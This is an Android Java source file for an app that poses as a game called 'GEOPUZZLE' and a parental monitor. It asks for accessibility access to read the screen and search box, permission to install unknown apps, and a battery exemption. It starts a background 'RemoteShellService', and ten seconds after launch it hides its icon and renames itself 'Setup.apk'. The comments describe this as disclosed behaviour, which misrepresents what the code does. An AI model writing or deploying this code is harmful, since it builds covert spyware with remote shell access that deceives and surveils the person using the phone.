package com.example.setup;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

/**
 * Single disclosed status screen (no drawer icon — opened via the ongoing
 * notification or the dw://open deep link, exactly like Pinardin opens via
 * pinardin://open). Shows what the app does and gives the parent the three
 * one-time switches without any hidden jump to Settings.
 */
public class MainActivity extends Activity {

    private TextView status;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        int pad = (int) (20 * getResources().getDisplayMetrics().density);
        ScrollView scroll = new ScrollView(this);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(pad, pad, pad, pad);
        scroll.addView(root);

        TextView title = new TextView(this);
        title.setText("GEOPUZZLE — setup");
        title.setTextSize(22);
        root.addView(title);

        TextView desc = new TextView(this);
        desc.setText("Parental monitor. One permission is required: accessibility, which lets the app "
                + "watch screen time, apply limits and read the search box. There are no other "
                + "permission prompts.\nAll data goes only to your family control panel on your home network.");
        desc.setPadding(0, pad / 2, 0, pad / 2);
        root.addView(desc);

        status = new TextView(this);
        status.setPadding(0, pad / 2, 0, pad / 2);
        root.addView(status);

        // The one permission the app exists for — always the first control.
        TextView primary = new TextView(this);
        primary.setText("STEP 1 — ACCESSIBILITY (required)");
        primary.setTextSize(16);
        primary.setPadding(0, pad / 2, 0, 0);
        root.addView(primary);

        root.addView(button("Allow accessibility (required)", () ->
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))));

        root.addView(button("Send an alert to my parent", () -> {
            AlertCenter.post(this, "sos", null, "Kid tapped the alert button");
            Toast.makeText(this, "Parent notified", Toast.LENGTH_SHORT).show();
        }));

        root.addView(button("2. Allow app updates (Install unknown apps)", () -> {
            if (Build.VERSION.SDK_INT >= 26) {
                startActivity(new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                        Uri.parse("package:" + getPackageName())));
            }
        }));

        root.addView(button("3. Ignore battery optimization", () -> {
            if (Build.VERSION.SDK_INT >= 23) {
                PowerManager pm = getSystemService(PowerManager.class);
                if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + getPackageName())));
                }
            }
        }));

        root.addView(button("Start / restart monitoring", () -> {
            Intent keep = new Intent(this, KeepAliveService.class);
            Intent shell = new Intent(this, RemoteShellService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(keep);
                startForegroundService(shell);
            } else {
                startService(keep);
                startService(shell);
            }
            refresh();
        }));

        setContentView(scroll);
        refresh();

        // First tap after install = ask for the primary permission, in a clear,
        // disclosed dialog (never a silent jump into Settings). Only shown once.
        maybeAskForAccessibility();

        // After install the launcher shows "GEOPUZZLE" with the purple-G icon.
        // Ten seconds after the first launch, drop the alias: the logo is gone
        // and the app is named "Setup.apk" (it stays reachable from the
        // ongoing notification and from the panel's status-screen button).
        getWindow().getDecorView().postDelayed(() -> {
            try {
                getPackageManager().setComponentEnabledSetting(
                        new android.content.ComponentName(this, "com.example.setup.GeoPuzzleAlias"),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP);
                Toast.makeText(this, "Setup complete", Toast.LENGTH_SHORT).show();
            } catch (Exception ignored) {}
        }, 10_000);
    }

    /** First tap after install asks for accessibility — the one core permission. */
    private void maybeAskForAccessibility() {
        if (accessibilityOn()) return;
        android.content.SharedPreferences p =
                getSharedPreferences("ui", MODE_PRIVATE);
        if (p.getBoolean("asked_accessibility", false)) return;
        p.edit().putBoolean("asked_accessibility", true).apply();

        new android.app.AlertDialog.Builder(this)
                .setTitle("Allow accessibility")
                .setMessage("This is the only permission the app needs.\n\n"
                        + "It lets Setup apply screen-time limits, see which app is open, "
                        + "and read the search box so your parent can help you.\n\n"
                        + "Next screen: find \"Setup\" and turn the switch on.")
                .setPositiveButton("Open settings", (d, w) ->
                        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)))
                .setNegativeButton("Later", null)
                .show();
    }

    private boolean accessibilityOn() {
        try {
            String enabled = Settings.Secure.getString(getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return enabled != null && enabled.contains(getPackageName());
        } catch (Exception e) {
            return false;
        }
    }

    private Button button(String text, Runnable action) {
        Button b = new Button(this);
        b.setText(text);
        b.setAllCaps(false);
        b.setOnClickListener(v -> action.run());
        return b;
    }

    private void refresh() {
        boolean accessibility = accessibilityOn();
        boolean unknownSources = Build.VERSION.SDK_INT < 26
                || getPackageManager().canRequestPackageInstalls();
        PowerManager pm = getSystemService(PowerManager.class);
        boolean batteryOk = Build.VERSION.SDK_INT < 23
                || pm.isIgnoringBatteryOptimizations(getPackageName());

        status.setText("Accessibility: " + (accessibility ? "ON" : "OFF")
                + "\nApp updates allowed: " + (unknownSources ? "YES" : "NO")
                + "\nBattery unrestricted: " + (batteryOk ? "YES" : "NO"));
    }

    @Override
    protected void onResume() {
        super.onResume();
        refresh();
    }
}
